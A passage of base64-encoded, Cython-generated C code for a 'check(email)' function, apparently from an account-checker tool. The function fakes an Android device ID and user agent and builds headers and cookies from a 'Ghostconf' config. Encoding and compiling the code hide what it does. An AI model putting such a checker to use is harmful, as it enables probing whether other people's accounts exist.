iAgcmV0dXJuIF9fcHl4X3I7Cn0KCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmF3XzExY2hlY2soUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCik7IApzdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8yYXdfMTFjaGVjayA9IHsiY2hlY2siLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJhd18xMWNoZWNrLCBfX1B5eF9NRVRIX0ZBU1RDQUxMfE1FVEhfS0VZV09SRFMsIDB9OwpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJhd18xMWNoZWNrKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCAKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMClB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2Vsc2UKUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbmRpZgopIHsKICBQeU9iamVjdCAqX19weXhfdl9lbWFpbCA9IDA7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogIENZVEhPTl9VTlVTRUQgUHlfc3NpemVfdCBfX3B5eF9uYXJnczsKICAjZW5kaWYKICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7CiAgUHlPYmplY3QqIHZhbHVlc1sxXSA9IHswfTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJjaGVjayAod3JhcHBlcikiLCAwKTsKICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpOwogICNlbHNlCiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX1NpemUoX19weXhfYXJncyk7IGlmICh1bmxpa2VseShfX3B5eF9uYXJncyA8IDApKSByZXR1cm4gTlVMTDsKICAjZW5kaWYKICAjZW5kaWYKICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTsKICB7CiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9lbWFpbCwwfTsKICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwOwogICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCAyMTcsIF9fcHl4X0wzX2Vycm9yKQogICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkgewogICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7CiAgICAgICAgY2FzZSAgMToKICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7CiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMjE3LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgY2FzZSAgMDogYnJlYWs7CiAgICAgICAgZGVmYXVsdDogZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjsKICAgICAgfQogICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzOwogICAgICBpZiAoX19QeXhfUGFyc2VLZXl3b3JkcyhfX3B5eF9rd2RzLCBfX3B5eF9rd3ZhbHVlcywgX19weXhfcHlhcmduYW1lcywgMCwgdmFsdWVzLCBrd2RfcG9zX2FyZ3MsIF9fcHl4X2t3ZHNfbGVuLCAiY2hlY2siLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIxNywgX19weXhfTDNfZXJyb3IpCiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAxOyBpKyspIHsKICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImNoZWNrIiwgMSwgMSwgMSwgaSk7IF9fUFlYX0VSUigwLCAyMTcsIF9fcHl4X0wzX2Vycm9yKSB9CiAgICAgIH0KICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMSkpIHsKICAgICAgZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjsKICAgIH0gZWxzZSB7CiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMjE3LCBfX3B5eF9MM19lcnJvcikKICAgIH0KICAgIF9fcHl4X3ZfZW1haWwgPSB2YWx1ZXNbMF07CiAgfQogIGdvdG8gX19weXhfTDZfc2tpcDsKICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7CiAgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImNoZWNrIiwgMSwgMSwgMSwgX19weXhfbmFyZ3MpOyBfX1BZWF9FUlIoMCwgMjE3LCBfX3B5eF9MM19lcnJvcikKICBfX3B5eF9MNl9za2lwOjsKICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOwogIF9fcHl4X0wzX2Vycm9yOjsKICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7CiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7CiAgfQogIF9fUHl4X0FkZFRyYWNlYmFjaygiYXcuY2hlY2siLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gTlVMTDsKICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7CiAgX19weXhfciA9IF9fcHl4X3BmXzJhd18xMGNoZWNrKF9fcHl4X3NlbGYsIF9fcHl4X3ZfZW1haWwpOwoKICAKICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7CiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7CiAgfQogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJhd18xMGNoZWNrKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X2VtYWlsKSB7CiAgUHlPYmplY3QgKl9fcHl4X3ZfdWEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2RldiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZGV2aWNlX2lkID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl91dWkgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2hlYWRlcnMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2RhdGEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3Jlc3BvbnNlID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDsKICBzaXplX3QgX19weXhfdF80OwogIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzggPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzkgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEwID0gTlVMTDsKICBpbnQgX19weXhfdF8xMTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJjaGVjayIsIDApOwoKICAKICBfX3B5eF90XzIgPSBOVUxMOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXJhdGVfdXNlcl9hZ2VudCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDIxOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19weXhfdF80ID0gMTsKICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMykpKSB7CiAgICBfX3B5eF90XzIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzMpOwogICAgYXNzZXJ0KF9fcHl4X3RfMik7CiAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMyk7CiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzMsIF9fcHl4X19mdW5jdGlvbik7CiAgICBfX3B5eF90XzQgPSAwOwogIH0KICAjZW5kaWYKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBOVUxMfTsKICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMywgX19weXhfY2FsbGFyZ3MrX19weXhfdF80LCAoMS1fX3B5eF90XzQpIHwgKF9fcHl4X3RfNCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMjE5LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIH0KICBfX3B5eF92X3VhID0gX19weXhfdF8xOwogIF9fcHl4X3RfMSA9IDA7CgogIAogIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FuZHJvaWQpOwogIF9fcHl4X3ZfZGV2ID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hbmRyb2lkOwoKICAKICBfX3B5eF90XzUgPSBOVUxMOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGFzaGxpYik7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDIyMSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9tZDUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAyMjEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogIF9fcHl4X3RfOCA9IE5VTEw7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91dWlkKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMjIxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTsKICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91dWlkNCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAyMjEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKICBfX3B5eF90XzQgPSAxOwogICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8xMCkpKSB7CiAgICBfX3B5eF90XzggPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzEwKTsKICAgIGFzc2VydChfX3B5eF90XzgpOwogICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzEwKTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzgpOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMTAsIF9fcHl4X19mdW5jdGlvbik7CiAgICBfX3B5eF90XzQgPSAwOwogIH0KICAjZW5kaWYKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF84LCBOVUxMfTsKICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDEtX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMjIxLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogIH0KICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfVW5pY29kZShfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMjIxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgX19weXhfdF82ID0gUHlVbmljb2RlX0FzRW5jb2RlZFN0cmluZygoKFB5T2JqZWN0KilfX3B5eF90XzEwKSwgTlVMTCwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDIyMSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICBfX3B5eF90XzQgPSAxOwogICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF83KSkpIHsKICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNyk7CiAgICBhc3NlcnQoX19weXhfdF81KTsKICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF83KTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNywgX19weXhfX2Z1bmN0aW9uKTsKICAgIF9fcHl4X3RfNCA9IDA7CiAgfQogICNlbmRpZgogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X3RfNn07CiAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzcsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDItX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMjIxLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIH0KICBfX3B5eF90XzMgPSBfX3B5eF90XzI7CiAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMyk7CiAgX19weXhfdF80ID0gMDsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8zLCBOVUxMfTsKICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZXhkaWdlc3QsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDEtX19weXhfdF80KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAyMjEsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgfQogIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0dldFNsaWNlKF9fcHl4X3RfMSwgMCwgMTYsIE5VTEwsIE5VTEwsICZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9zbGljZVswXSwgMCwgMSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDIyMSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgX19weXhfdF8xID0gUHlOdW1iZXJfQWRkKF9fcHl4X3ZfZGV2LCBfX3B5eF90XzIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAyMjEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogIF9fcHl4X3ZfZGV2aWNlX2lkID0gX19weXhfdF8xOwogIF9fcHl4X3RfMSA9IDA7CgogIAogIF9fcHl4X3RfMiA9IE5VTEw7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91dWlkKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMjIyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3V1aWQ0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMjIyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBfX3B5eF90XzQgPSAxOwogICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF83KSkpIHsKICAgIF9fcHl4X3RfMiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNyk7CiAgICBhc3NlcnQoX19weXhfdF8yKTsKICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF83KTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIpOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNywgX19weXhfX2Z1bmN0aW9uKTsKICAgIF9fcHl4X3RfNCA9IDA7CiAgfQogICNlbmRpZgogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIE5VTEx9OwogICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzQsICgxLV9fcHl4X3RfNCkgfCAoX19weXhfdF80Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAyMjIsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgfQogIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMjIyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICBfX3B5eF92X3V1aSA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNyk7CiAgX19weXhfdF83ID0gMDsKCiAgCiAgX19weXhfdF83ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAyMjQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3Rjb25mKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMjI0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlcl9hZ2VudF9oZWFkZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyMjQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X3RfMiwgX19weXhfdl91YSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMjQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwoKICAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0Y29uZik7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDIyNSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nvb2tpZV9oZWFkZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAyMjUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3Rjb25mKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMjI1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0oX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29va2llX3ZhbHVlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMjI1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF90Xz